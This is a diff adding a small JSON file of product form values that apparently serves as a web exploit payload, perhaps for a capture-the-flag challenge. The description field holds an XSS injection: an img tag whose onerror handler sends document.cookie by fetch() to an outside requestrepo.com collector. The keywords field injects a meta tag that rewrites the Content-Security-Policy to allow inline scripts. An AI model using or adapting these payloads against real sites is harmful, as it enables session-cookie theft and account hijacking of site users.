@@ -1,0 +1,9 @@
+{
+  "product_name": "bbt",
+  "product_desc": "<img name=\"potionTypes\" id=\"1\" src=\"#x'onerror=fetch('http://460w2vb2.requestrepo.com/?c='+document.cookie)//\"><img name=\"potionTypes\" id=\"2\">",
+  "product_price": "1337",
+  "product_category": "1",
+  "product_keywords": "\"><meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline' http://127.0.0.1/static/js/jquery.min.js http://127.0.0.1/static/js/product.js\">",
+  "product_og_title": "Title",
+  "product_og_desc": "ss"
+}
